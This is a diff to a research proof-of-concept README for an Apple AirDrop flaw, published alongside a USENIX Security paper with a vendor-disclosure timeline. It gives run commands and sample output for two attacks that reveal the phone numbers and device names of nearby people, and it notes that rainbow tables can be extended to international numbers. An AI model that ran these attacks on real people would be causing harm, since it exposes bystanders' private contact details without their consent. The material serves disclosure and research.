@@ -1,10 +1,13 @@
 # PoC: AirDrop Phone Number Leak
 
-This PoCs demonstrates the contact identifier leakage in Apple AirDrop that was described in
+This PoC demonstrates the contact identifier leakage in Apple AirDrop that was described in
 
-* Alexander Heinrich, Matthias Hollick, Thomas Schneider, Milan Stute, and Christian Weinert. **PrivateDrop: Practical Privacy-Preserving Authentication for Apple AirDrop** in _30th USENIX Security Symposium_. [Website](https://privatedrop.github.io). [Preprint](https://www.usenix.org/system/files/sec21fall-heinrich.pdf).
+* **[HHSSW21]** Alexander Heinrich, Matthias Hollick, Thomas Schneider, Milan Stute, and Christian Weinert. **PrivateDrop: Practical Privacy-Preserving Authentication for Apple AirDrop** in _30th USENIX Security Symposium_. [Website](https://privatedrop.github.io). [Preprint](https://www.usenix.org/system/files/sec21fall-heinrich.pdf).
 
-**Note:** We configured the used rainbow table to only work with German mobile phone numbers (prefix: +49). Other tables, e.g., containing all international phone numbers, can be generated with [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers)'s `rtgen`.
+The paper also proposes a privacy-preserving drop-in replacement for Apple AirDrop.
+
+**We notified Apple about this vulnerability on May 11, 2019. Until today, Apple has neither mitigated the issue nor informed us that they are planning to do so.
+This means that current Apple systems are still vulnerable (iOS 14.4.2 and macOS 11.2.3 as of April 19, 2021).**
 
 ## Installation
 
@@ -36,6 +39,12 @@ cd ..
 
 ## Usage
 
+Our PoC is able to exploit both vulnerabilities explained in [HHSSW21]. We provide instructions on how to replicate 
+
+**Note:** We configured the used rainbow table to only work with German mobile phone  numbers (prefix: +49). Other tables, e.g., containing all international phone numbers, can be generated with [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers)'s `rtgen`.
+
+### Contact Identifier Leakage of Sender (§3.3 in [HHSSW21])
+
 Simply run the following and wait for someone in proximity to open the AirDrop sharing menu.
 
 ```bash
@@ -48,4 +57,23 @@ An example output would look like this:
 Announcing service: host opendrop, address fe80::c8b9:fbff:fee9:d544, port 8771
 Starting HTTPS server
 Nearby phone number: +49<...>
+```
+
+### Contact Identifier Leakage of Receiver (§3.4 in [HHSSW21])
+
+Exploiting this vulnerability requires the victim to have the attacker in their address book. 
+In particular, the attacker needs to present a valid AirDrop certificate containing its contact identifiers to the victim.
+You can follow [these instructions](https://github.com/seemoo-lab/airdrop-keychain-extractor) to extract your current AirDrop certificate and use it with OpenDrop.
+This attack does not require any interaction on part of the victim. Simply run:
+
+```bash
+python3 -m opendrop find
+```
+
+An example output would look like this:
+
+```
+Looking for receivers. Press Ctrl+C to stop ...
+Nearby phone number: +49<...>
+Found  index 0  ID a019b536c38b  name John Doe's iPhone
 ```
